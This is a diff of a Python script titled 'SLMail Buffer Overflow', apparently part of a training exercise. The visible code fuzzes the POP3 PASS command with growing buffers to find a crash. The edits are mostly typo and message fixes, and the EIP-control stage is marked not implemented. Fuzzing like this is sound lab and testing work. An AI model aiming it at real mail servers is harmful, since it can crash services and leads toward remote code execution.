@@ -15,21 +15,20 @@ def main(argv):
     clinetPORT = 110
 
     # Parse for verbose information
-    #
     parser = argparse.ArgumentParser(prog="SLMail Buffer Overflow")
     parser.add_argument('--fuzz', '-f', action='store_true', default=False,
         help='run password fuzzer')
     parser.add_argument('--controlEIP', '-c', action='store_true', default=False,
         help='control EIP')
 
-    # Parse args for
+    # Parse args for user input
     args = parser.parse_args()
 
     # Run appropriate functions
     if args.fuzz == True:
         return fuzz_pass(clientIP, clinetPORT)
     elif args.controlEIP == True:
-        print("HI")
+        print("Not implemented..")
         #return fuzz_pass(clientIP, clinetPORT)   
 
     return 0
@@ -42,7 +41,7 @@ def fuzz_pass(clientIP, clinetPORT):
     # Declare a acceptable buffer size that fits into TCP Packet
     BUFFER_SIZE = 1024
 
-    # Define Static username to pass into POP3 protocol USER prompt
+    # Define Static user-name to pass into POP3 protocol USER prompt
     USER = "user"
 
     # Loop over PASS input sizes 
@@ -53,14 +52,14 @@ def fuzz_pass(clientIP, clinetPORT):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((clientIP, clinetPORT))
         except Exception as e:
-            print("\n\nConnection could not be made to server.")
-            print("Exception: " + str(e))
+            print("Connection could not be made to server.")
+            print("Exception: " + str(e) + "\n\n")
             s.close()
             return -1
 
         # Print for debug to console the length of password buffer
         print("Connection to POP3 Server Successful! \n" +\
-            "Testing Password Buffer Size of" + str(i) + " bytes.")
+            "Testing Password Buffer Size of " + str(i) + " bytes.")
 
         # Send server username
         s.send(bytes("USER " + USER + "\r\n", 'UTF-8'))
@@ -81,6 +80,7 @@ def fuzz_pass(clientIP, clinetPORT):
         # Reset connection for next iteration
         s.close()
     return 0
-# Run main if tihs is ran as main function. 
+
+# Run main if this is ran as main function. 
 if __name__ == "__main__":
     main(sys.argv)
